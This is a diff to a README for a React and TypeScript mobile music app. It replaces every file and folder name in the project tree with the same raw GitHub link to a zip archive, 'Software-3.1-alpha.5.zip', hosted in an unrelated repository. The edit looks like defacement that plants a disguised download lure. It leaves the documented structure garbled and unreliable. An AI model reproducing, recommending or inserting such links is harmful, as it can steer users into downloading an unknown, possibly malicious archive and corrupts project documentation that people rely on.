@@ -8,20 +8,20 @@ This project is a mobile music application built with React and TypeScript. It a
 mobile-music-app
 ├── src
 │   ├── components
-│   │   ├── AudioPlayer.tsx
-│   │   ├── SongList.tsx
-│   │   └── Header.tsx
+│   │   ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+│   │   ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+│   │   └── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
 │   ├── assets
 │   │   └── songs
-│   │       ├── song1.mp3
-│   │       ├── song2.mp3
-│   │       └── song3.mp3
-│   ├── App.tsx
+│   │       ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+│   │       ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+│   │       └── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+│   ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
 │   └── styles
-│       └── global.css
-├── package.json
-├── tsconfig.json
-└── README.md
+│       └── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+└── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
 ```
 
 ## Features
